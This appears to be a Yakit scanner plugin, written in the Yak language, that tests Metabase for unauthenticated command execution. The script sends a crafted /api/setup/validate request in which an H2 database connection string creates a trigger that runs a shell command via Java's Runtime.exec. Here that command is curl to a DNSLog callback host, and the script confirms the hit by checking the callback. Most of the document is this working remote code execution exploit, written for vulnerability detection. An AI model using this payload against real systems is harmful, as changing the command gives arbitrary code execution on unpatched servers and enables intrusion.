script_name: Metabase 未授权命令执行漏洞
content:
# port scan plugin
# from 虚拟尽头
yakit.AutoInitYakit()

handleCheck = func(addr){
    server, token, err = risk.NewDNSLogDomain()
    isTls = str.IsTLSServer(addr)
    packet = `POST /api/setup/validate HTTP/1.1
Host: {{params(target)}}
Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 750

{
    "token": "a50eb257-e56c-4dd8-b4ba-e67d7bc59261",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl {{params(server)}}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"server":server}),
     poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    	if len(rsp) > 0 {
            sleep(5)
            dnsdata, dnserr = risk.CheckDNSLogByToken(token)
        	if len(dnsdata) > 0 {
                    risk.NewRisk(
                        target, risk.severity("high"), 
                        risk.title("Metabase 未授权命令执行漏洞"),
                        risk.type("命令执行"),
                        risk.request(req),
                        risk.response(rsp),
                        risk.details({
                            "packet":string(packet),
                            "payload":server,
                            }
                        ),
                )
        }
    }
    return
}

target = cli.String("root_url")
ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip, port)
handleCheck(addr)
author: 迹
online_script_name: Metabase 未授权命令执行漏洞
